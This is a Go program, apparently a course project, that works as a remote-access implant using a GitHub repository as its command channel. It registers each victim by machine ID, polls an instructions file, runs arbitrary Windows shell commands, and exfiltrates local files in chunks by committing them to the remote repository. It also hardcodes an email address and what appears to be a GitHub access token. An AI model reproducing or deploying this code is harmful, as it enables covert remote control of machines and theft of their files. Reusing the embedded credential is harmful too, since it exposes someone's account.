package main

import (
	"bufio"
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"path"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/denisbrodbeck/machineid"
	billy "github.com/go-git/go-billy/v5"
	memfs "github.com/go-git/go-billy/v5/memfs"
	util "github.com/go-git/go-billy/v5/util"
	git "github.com/go-git/go-git/v5"
	"github.com/go-git/go-git/v5/plumbing"
	http "github.com/go-git/go-git/v5/plumbing/transport/http"
	memory "github.com/go-git/go-git/v5/storage/memory"
)

const REPOSITORY = "https://github.com/SeanRobertDH/CS5231_Test_Repo.git"
const FILE_SIZE = 1024
const INSTR_FILE = "instructions"
const SLEEP_SECONDS = 10

var AUTH = &http.BasicAuth{
	Username: "seandh1998@gmail.com",
	Password: "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",
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randString() string {
	b := make([]rune, 6)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func handleError(err error) {
	if err != nil {

		_, filename, line, _ := runtime.Caller(1)
		fmt.Printf("%s:%d (%s)", filename, line, err)
		os.Exit(1)
	}
}

func commitFile(r *git.Repository, filepath string) {
	w, err := r.Worktree()
	handleError(err)
	w.Add(filepath)
	w.Commit("", &git.CommitOptions{})
	//Push the code to the remote
	err = r.Push(&git.PushOptions{
		RemoteName: "origin",
		Auth:       AUTH,
	})
	handleError(err)
}

func execCommand(r *git.Repository, fs billy.Filesystem, command string) {
	re := regexp.MustCompile(`\s+`)
	argsplit := re.Split(string(command), -1)
	argsplit = append([]string{"/C"}, argsplit...)
	c := exec.Command("cmd", argsplit...)
	filepath := command + randString()
	newFile, err := fs.Create(filepath)
	handleError(err)
	c.Stdout = newFile
	c.Stderr = newFile

	err = c.Run()
	handleError(err)

	newFile.Close()
	commitFile(r, filepath)

	fs.Remove(filepath)
}

func stealFile(r *git.Repository, fs billy.Filesystem, filepath string) {
	filename := path.Base(filepath) + randString()

	filePtr, err := os.Open(filepath)
	handleError(err)
	reader := bufio.NewReader(filePtr)

	buf := make([]byte, FILE_SIZE)
	for i := 0; true; i++ {
		n, rerr := reader.Read(buf)
		if n == 0 {
			break
		}
		filepath = filename + strconv.Itoa(i)
		newFile, err := fs.Create(filepath)
		handleError(err)

		newFile.Write(buf[:n])
		newFile.Close()
		commitFile(r, filepath)

		fs.Remove(filepath)

		if rerr == io.EOF {
			break
		}
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	instructFs := memfs.New()

	instructRepo, err := git.Clone(memory.NewStorage(), instructFs, &git.CloneOptions{
		URL:          REPOSITORY,
		Auth:         AUTH,
		SingleBranch: true,
	})
	handleError(err)

	id, err := machineid.ID()
	handleError(err)

	branchName := plumbing.NewBranchReferenceName(id)
	headRef, err := instructRepo.Head()
	handleError(err)

	ref := plumbing.NewHashReference(branchName, headRef.Hash())
	err = instructRepo.Storer.SetReference(ref)
	handleError(err)

	err = instructRepo.Push(&git.PushOptions{
		RemoteName: "origin",
		Auth:       AUTH,
	})
	handleError(err)

	fileFs := memfs.New()
	fileRepo, err := git.Clone(memory.NewStorage(), fileFs, &git.CloneOptions{
		URL:           REPOSITORY,
		Auth:          AUTH,
		SingleBranch:  true,
		ReferenceName: ref.Name(),
	})
	handleError(err)

	do_print := true
	for {
		if do_print {
			filepath := INSTR_FILE
			unreadInstr := ""
			content, err := util.ReadFile(instructFs, filepath)
			handleError(err)

			re := regexp.MustCompile("\r?\n")

			for _, command := range re.Split(string(content), -1) {
				re := regexp.MustCompile(`"[^"]+"`)
				argument := re.FindString(command)
				if argument == "" || strings.HasPrefix(command, "#") {
					unreadInstr += command + "\n"
					continue
				}
				argument = argument[1 : len(argument)-1]
				switch {
				case strings.HasPrefix(command, "cmd"):
					execCommand(fileRepo, fileFs, argument)
				case strings.HasPrefix(command, "exfil"):
					stealFile(fileRepo, fileFs, argument)
				}
			}
		}
		time.Sleep(SLEEP_SECONDS * time.Second)

		w, err := instructRepo.Worktree()
		handleError(err)

		err = w.Pull(&git.PullOptions{
			Auth:         AUTH,
			SingleBranch: true,
		})
		//Cannot pull because worktree contains unstaged changes
		if err == git.NoErrAlreadyUpToDate {
			do_print = false
			continue
		}
		handleError(err)
		do_print = true
	}
}
